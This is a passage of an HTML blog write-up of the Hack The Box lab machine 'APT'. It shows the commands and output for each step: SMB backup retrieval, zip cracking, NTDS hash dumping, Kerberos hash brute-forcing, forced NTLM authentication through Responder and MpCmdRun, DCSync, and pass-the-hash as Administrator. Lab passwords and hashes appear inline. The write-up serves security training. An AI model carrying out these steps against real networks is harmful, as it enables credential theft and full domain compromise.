class="line">└─$ nmap -6 --min-rate 1000 -sC -sV -oA nmap/initial-apt-ipv6 <span class="string">&#x27;dead:beef::b885:d62a:d679:573f&#x27;</span> -v</span><br><span class="line">...[SNIP]...</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">53/tcp  open  domain?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP: </span><br><span class="line">|     version</span><br><span class="line">|_    <span class="built_in">bind</span></span><br><span class="line">80/tcp  open  http         Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Gigantic Hosting | Home</span><br><span class="line">88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-15 00:36:03Z)</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=apt.htb.local</span><br><span class="line">| Subject Alternative Name: DNS:apt.htb.local</span><br><span class="line">| Issuer: commonName=apt.htb.local</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2020-09-24T07:07:18</span><br><span class="line">| Not valid after:  2050-09-24T07:17:18</span><br><span class="line">| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22</span><br><span class="line">|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2021-04-15T00:38:57+00:00; -1s from scanner time.</span><br><span class="line">445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp open  kpasswd5?</span><br><span class="line">593/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=apt.htb.local</span><br><span class="line">| Subject Alternative Name: DNS:apt.htb.local</span><br><span class="line">| Issuer: commonName=apt.htb.local</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2020-09-24T07:07:18</span><br><span class="line">| Not valid after:  2050-09-24T07:17:18</span><br><span class="line">| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22</span><br><span class="line">|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2021-04-15T00:38:57+00:00; -1s from scanner time.</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V=7.80%I=7%D=4/14%Time=60778A78%P=x86_64-pc-linux-gnu%r(DNSV</span><br><span class="line">SF:ersionBindReqTCP,20,<span class="string">&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span></span><br><span class="line"><span class="string">SF:x04bind\0\0\x10\0\x03&quot;</span>);</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -12m00s, deviation: 26m48s, median: -1s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: apt</span><br><span class="line">|   NetBIOS computer name: APT\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: apt.htb.local</span><br><span class="line">|_  System time: 2021-04-15T01:38:41+01:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2021-04-15T00:38:39</span><br><span class="line">|_  start_date: 2021-04-14T16:50:06</span><br></pre></td></tr></table></figure></div>
+<p>Our current information is Domain|ipv6|Hostname</p>
+<h1 id="impacket-smbclient"><a href="#impacket-smbclient" class="headerlink" title="impacket smbclient"></a>impacket smbclient</h1><p>whereis apt?  [[APT - AttckforWork#UUID IObjectExporter]]</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ smbclient \\\\apt\\backup</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\kali]:</span><br><span class="line">Anonymous login successful</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">dir</span></span><br><span class="line">  .                                   D        0  Thu Sep 24 03:30:52 2020</span><br><span class="line">  ..                                  D        0  Thu Sep 24 03:30:52 2020</span><br><span class="line">  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020</span><br><span class="line"></span><br><span class="line">                5114623 blocks of size 4096. 2634896 blocks available</span><br><span class="line">smb: \&gt; get backup.zip </span><br><span class="line">getting file \backup.zip of size 10650961 as backup.zip (712.3 KiloBytes/sec) (average 712.3 KiloBytes/sec)</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h1><p>unzip prompt have password ↓</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ unzip backup.zip </span><br><span class="line">Archive:  backup.zip</span><br><span class="line">   creating: Active Directory/</span><br><span class="line">[backup.zip] Active Directory/ntds.dit password: </span><br><span class="line">password incorrect--reenter: </span><br><span class="line">password incorrect--reenter: </span><br><span class="line">   skipping: Active Directory/ntds.dit  incorrect password</span><br><span class="line">   skipping: Active Directory/ntds.jfm  incorrect password</span><br><span class="line">   creating: registry/</span><br><span class="line">   skipping: registry/SECURITY       incorrect password</span><br><span class="line">   skipping: registry/SYSTEM         incorrect password</span><br><span class="line">                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="zip2john"><a href="#zip2john" class="headerlink" title="zip2john"></a>zip2john</h1><p>Use zip2john save hash</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ zip2john backup.zip &gt; backup.zip.hash</span><br><span class="line">Created directory: /home/kali/.john</span><br><span class="line">ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression <span class="built_in">type</span></span><br><span class="line">ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 <span class="built_in">type</span>=8</span><br><span class="line">ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 <span class="built_in">type</span>=8</span><br><span class="line">ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression <span class="built_in">type</span></span><br><span class="line">ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb <span class="built_in">type</span>=8</span><br><span class="line">ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 <span class="built_in">type</span>=8</span><br><span class="line">NOTE: It is assumed that all files <span class="keyword">in</span> each archive have the same password.</span><br><span class="line">If that is not the <span class="keyword">case</span>, the <span class="built_in">hash</span> may be uncrackable. To avoid this, use</span><br><span class="line">option -o to pick a file at a time.</span><br></pre></td></tr></table></figure></div>
+
+
+<h1 id="Fcrackzip"><a href="#Fcrackzip" class="headerlink" title="Fcrackzip"></a>Fcrackzip</h1><p>Fcrackzip Brute Force Ziphash</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ fcrackzip -u -D -p ../rockyou.txt backup.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == iloveyousomuch</span><br><span class="line">    ┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ fcrackzip -u -D -p ../rockyou.txt backup.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == iloveyousomuch</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="Hash-extract"><a href="#Hash-extract" class="headerlink" title="Hash extract"></a>Hash extract</h1><p>Extracting the contents provides us with the NTDS database as well as with the SECURITY and SYSTEM registry hives. This can be used to obtain NTLM hashes for all users existing during this snapshot. We can use impacket’s secretsdump to extract the hashes.</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py <span class="built_in">local</span> -system registry/SYSTEM -security registry/SECURITY -ntds Active\ Directory/ntds.dit -outputfile hashes</span><br><span class="line"></span><br><span class="line">awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> hashes &gt; <span class="built_in">users</span></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ ./kerbrute_linux_amd64 userenum -d htb.local --dc apt 123.txt </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 07/29/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/07/29 14:43:14 &gt;  Using KDC(s):</span><br><span class="line">2022/07/29 14:43:14 &gt;   apt:88</span><br><span class="line"></span><br><span class="line">2022/07/29 14:43:19 &gt;  [+] VALID USERNAME:       Administrator@htb.local</span><br><span class="line">2022/07/29 14:43:19 &gt;  [+] VALID USERNAME:       APT<span class="variable">$@htb</span>.<span class="built_in">local</span></span><br><span class="line">2022/07/29 14:50:57 &gt;  [+] VALID USERNAME:       henry.vinson@htb</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h1><p>Use Cme Concat user</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ crackmapexec smb apt -u henry.vinson -H 2de80758521541d19cabba480b260e8f</span><br><span class="line">SMB         apt             445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         apt             445    APT              [-] htb.local\henry.vinson:2de80758521541d19cabba480b260e8f STATUS_LOGON_FAILURE </span><br><span class="line">     </span><br></pre></td></tr></table></figure></div>
+
+<h2 id="PyKerbrute"><a href="#PyKerbrute" class="headerlink" title="PyKerbrute"></a>PyKerbrute</h2><p>Use hash brete</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ python2 kerbBruteHash.py apt htb.local henry.vinson hashes_ntlm</span><br><span class="line">[*] DomainControlerAddr: apt </span><br><span class="line">[*] DomainName: HTB.LOCAL </span><br><span class="line">[*] Username: henry.vinson </span><br><span class="line">[*] Using TCP to <span class="built_in">test</span> a single username with list of hashes. </span><br><span class="line">[+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="Reg"><a href="#Reg" class="headerlink" title="Reg"></a>Reg</h1><div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ reg.py htb.local/henry.vinson@apt -hashes <span class="string">&#x27;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb&#x27;</span> query -keyName HKU\\Software\\GiganticHostingManagementSystem Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation </span><br><span class="line">[!] Cannot check RemoteRegistry status. Hoping it is started... </span><br><span class="line">HKU\Software\GiganticHostingManagementSystem </span><br><span class="line">      UserName REG_SZ henry.vinson_adm </span><br><span class="line">      PassWord REG_SZ G1<span class="comment">#Ny5@2dvht</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="Evil-winrm"><a href="#Evil-winrm" class="headerlink" title="Evil-winrm"></a>Evil-winrm</h1><div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ evil-winrm -i apt -u henry.vinson_adm -p <span class="string">&#x27;G1#Ny5@2dvht&#x27;</span> Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint </span><br><span class="line">*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents&gt; <span class="built_in">cd</span> ..\Desktop </span><br><span class="line">*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop&gt; <span class="built_in">type</span> user.txt </span><br><span class="line">745212a817f60f27befd...[SNIP]...</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="Responder-And-MpCmdRun"><a href="#Responder-And-MpCmdRun" class="headerlink" title="Responder And MpCmdRun"></a>Responder And MpCmdRun</h1><p>After that, I can start <code>Responder</code> to listen on my tun0 interface and use the <code>--lm</code> option which will downgrade the authentication to NTLMv1.</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ responder -I tun0 --lm </span><br><span class="line"> NBT-NS, LLMNR &amp; MDNS Responder 2.3.4.0 </span><br><span class="line"> Author: Laurent Gaffie (laurent.gaffie@gmail.com) </span><br><span class="line"> To <span class="built_in">kill</span> this script hit CTRL-C </span><br><span class="line"> </span><br><span class="line"> [+] Poisoners: </span><br><span class="line">	 LLMNR [ON] </span><br><span class="line">	 NBT-NS [ON] </span><br><span class="line">	 DNS/MDNS [ON] </span><br><span class="line">[+] Servers: </span><br><span class="line">	HTTP server [ON] </span><br><span class="line">	HTTPS server [ON] </span><br><span class="line">	WPAD proxy [OFF] </span><br><span class="line">	Auth proxy [OFF] </span><br><span class="line">	SMB server [ON] </span><br><span class="line">	Kerberos server [ON] </span><br><span class="line">	SQL server [OFF] </span><br><span class="line">	FTP server [OFF] </span><br><span class="line">	IMAP server [OFF] </span><br><span class="line">	POP3 server [OFF] </span><br><span class="line">	SMTP server [OFF] </span><br><span class="line">	DNS server [ON] </span><br><span class="line">	LDAP server [ON] </span><br><span class="line">	RDP server [OFF] </span><br><span class="line">[+] HTTP Options: </span><br><span class="line">	Always serving EXE [OFF] </span><br><span class="line">	Serving EXE [OFF] </span><br><span class="line">	Serving HTML [OFF] </span><br><span class="line">	Upstream Proxy [OFF] </span><br><span class="line">[+] Poisoning Options: </span><br><span class="line">	Analyze Mode [OFF] </span><br><span class="line">	Force WPAD auth [OFF]</span><br><span class="line">	Force Basic Auth [OFF] </span><br><span class="line">	Force LM downgrade [ON] </span><br><span class="line">	Fingerprint hosts [OFF] </span><br><span class="line">[+] Generic Options: </span><br><span class="line">	Responder NIC [tun0] </span><br><span class="line">	Responder IP [10.129.96.60] </span><br><span class="line">	Challenge <span class="built_in">set</span> [1122334455667788] </span><br><span class="line">	Don<span class="string">&#x27;t Respond To Names [&#x27;</span>ISATAP<span class="string">&#x27;] </span></span><br><span class="line"><span class="string">[+] Listening for events...</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
+
+<p>Now on APT Server, I can force authentication with <code>MpCmdRun.exe</code> (located on <code>C:\Program Files\Windows Defender</code>).</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Program Files\Windows Defender&gt;.\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.72\notexist </span><br><span class="line">Scan starting... </span><br><span class="line">CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.<span class="built_in">log</span> <span class="keyword">for</span> more information</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Listening <span class="keyword">for</span> events... </span><br><span class="line">[SMB] NTLMv1 Client : 10.129.96.60</span><br><span class="line">[SMB] NTLMv1 Username : HTB\APT$ </span><br><span class="line">[SMB] NTLMv1 Hash : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="Hashdump"><a href="#Hashdump" class="headerlink" title="Hashdump"></a>Hashdump</h1><p>NTLM Hash of a computer account can not be used for remote login. Instead, it can be used to perform DCSync attack using <code>secretsdump.py</code>. I’ll take only the administrator hash.</p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ secretsdump.py <span class="string">&#x27;htb.local/APT$@apt&#x27;</span> -hashes <span class="string">&#x27;d167c3238864b12f5f82feae86a7f798:d167c3238864b12f5f82feae86a7f798&#x27;</span> -just-dc-user administrator </span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) </span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2::: </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+<p>Use Administrator Hash login Apt domain </p>
+<div class="highlight-wrap" data-rel=""><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/IOXIDResolver-master]</span><br><span class="line">└─$ evil-winrm -i apt -u administrator -H c370bddf384a691d811ff3495e8a72e2</span><br></pre></td></tr></table></figure></div>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/Attckforwork/">Github</a></li>
+         
+          <li><a href="/atom.xml">Rss</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#KnowLedGePoint"><span class="toc-number">1.</span> <span class="toc-text">KnowLedGePoint</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IP-PORT-SCAN"><span class="toc-number"></span> <span class="toc-text">IP PORT SCAN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number"></span> <span class="toc-text">Nmap Scan</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Impacket"><span class="toc-number"></span> <span class="toc-text">Impacket</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RPCMAP"><span class="toc-number"></span> <span class="toc-text">RPCMAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example"><span class="toc-number"></span> <span class="toc-text">Example</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UUID-MAP"><span class="toc-number"></span> <span class="toc-text">UUID MAP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#UUID-IObjectExporter"><span class="toc-number"></span> <span class="toc-text">UUID IObjectExporter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number"></span> <span class="toc-text">Nmap</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#impacket-smbclient"><span class="toc-number"></span> <span class="toc-text">impacket smbclient</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unzip"><span class="toc-number"></span> <span class="toc-text">unzip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#zip2john"><span class="toc-number"></span> <span class="toc-text">zip2john</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fcrackzip"><span class="toc-number"></span> <span class="toc-text">Fcrackzip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hash-extract"><span class="toc-number"></span> <span class="toc-text">Hash extract</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crackmapexec"><span class="toc-number"></span> <span class="toc-text">crackmapexec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PyKerbrute"><span class="toc-number"></span> <span class="toc-text">PyKerbrute</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reg"><span class="toc-number"></span> <span class="toc-text">Reg</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Evil-winrm"><span class="toc-number"></span> <span class="toc-text">Evil-winrm</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Responder-And-MpCmdRun"><span class="toc-number"></span> <span class="toc-text">Responder And MpCmdRun</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hashdump"><span class="toc-number"></span> <span class="toc-text">Hashdump</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.hack0day.net/2022/07/30/APT-AttckForWork/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&text=APT - AttckForWork"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&title=APT - AttckForWork"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&is_video=false&description=APT - AttckForWork"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=APT - AttckForWork&body=Check out this article: https://www.hack0day.net/2022/07/30/APT-AttckForWork/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&title=APT - AttckForWork"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&title=APT - AttckForWork"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&title=APT - AttckForWork"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&title=APT - AttckForWork"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&name=APT - AttckForWork&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
